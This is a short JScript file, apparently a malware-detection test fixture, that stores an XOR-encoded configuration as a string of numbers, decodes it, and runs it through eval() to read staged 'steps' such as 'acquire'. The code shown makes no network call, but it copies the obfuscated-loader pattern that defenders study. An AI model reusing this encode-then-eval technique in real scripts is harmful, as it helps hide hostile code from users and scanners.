// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_b1547b48 = function decode_b1547b48_body(storedMaterial) {
  var recoveredMaterial = [];
  var previous = 144;
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push(storedMaterial[i] ^ previous); previous = storedMaterial[i]; }
  return recoveredMaterial;
};
var recover_9bdde25e = function recover_9bdde25e_body() {
  // configuration reconstruction
  var packedText = "235-201-186-206-171-219-168-138-176-235-201-168-203-186-207-166-212-177-238-156-249-148-251-143-234-200-228-198-177-195-170-222-187-228-130-235-135-226-192-236-206-170-195-176-192-161-213-182-222-129-241-131-236-143-234-153-234-200-228-198-174-207-161-197-170-204-170-245-134-229-151-254-142-250-216-133-169-139-234-142-239-159-235-142-252-222-228-198-145-248-150-222-170-222-174-128-215-190-208-152-236-152-232-186-223-174-219-190-205-185-151-162-140-189-159-179-145-231-134-234-159-250-137-171-145-234-200-171-202-167-215-182-223-184-214-137-224-132-166-156-190-221-188-209-161-192-169-206-160-141-181-211-230-128-229-212-229-215-180-132-166-138-168-221-175-195-225-219-249-145-229-145-225-146-168-135-168-144-246-195-165-192-241-192-242-145-161-143-234-146-243-158-238-130-231-201-160-206-184-217-181-220-184-151-243-193-245-197-247-196-162-199-233-141-236-152-186-150-180-193-178-215-165-250-155-252-153-247-131-161-155-185-241-132-234-158-236-137-250-137-197-164-198-233-209-183-130-228-129-176-129-179-208-224-194-238-204-170-195-175-202-149-229-132-240-152-186-128-162-225-219-135-219-142-253-152-234-153-197-153-201-188-222-178-219-184-228-184-240-133-235-159-237-136-251-136-196-165-199-155-199-180-192-161-198-163-142-182-208-229-131-230-215-230-212-183-135-169-205-172-216-250-214-244-134-227-132-237-158-234-152-225-190-206-175-219-179-145-171-137-193-138-201-156-192-156-207-160-198-178-197-164-214-179-239-179-251-142-224-148-230-131-240-131-207-174-204-144-204-136-225-146-226-141-254-159-253-145-244-168-244-204-170-159-249-156-173-156-174-205-253-223-243-209-191-218-162-214-137-250-142-239-136-237-207-245-215-187-212-183-214-186-151-243-154-233-153-248-140-239-135-169-195-176-146-239-195-225-146-230-135-224-133-198-169-220-178-198-228-222-234-151";
  var packedParts = packedText.split("-");
  var storedMaterial = [];
  for (var di = 0; di < packedParts.length; di++) { storedMaterial.push(parseInt(packedParts[di], 10)); }

  var recoveredMaterial = [];
  var state = 1;
  switch (state) { case 1: recoveredMaterial = decode_b1547b48.apply(null, [storedMaterial]); break; default: recoveredMaterial = []; }
  var configurationText = recoveredMaterial.length ? String.fromCharCode(recoveredMaterial[0]) : "";
  for (var bi = 1; bi < recoveredMaterial.length; bi++) { configurationText = configurationText.concat(String.fromCharCode(recoveredMaterial[bi])); }
  return configurationText;
  // end reconstruction
};
var inspect_87b53640 = function inspect_87b53640_body() {
  var configuration = eval("(" + recover_9bdde25e.apply(null, []) + ")");
  var table = { steps: function() { return configuration.steps; }, values: function() { return configuration.values; } };
  return { steps: table.steps.apply(null, []), adapter: configuration["adapter"], values: table["values"].apply(null, []), stageCount: configuration["stageCount"] };
};
